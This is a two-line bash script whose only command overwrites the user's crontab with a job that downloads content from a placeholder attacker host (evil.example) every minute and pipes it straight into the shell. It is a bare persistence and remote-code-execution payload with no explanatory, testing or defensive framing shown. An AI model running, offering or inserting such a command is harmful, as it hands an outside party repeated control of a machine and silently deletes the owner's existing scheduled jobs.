#!/bin/bash
echo "* * * * * curl -s http://evil.example/p | sh" | crontab -
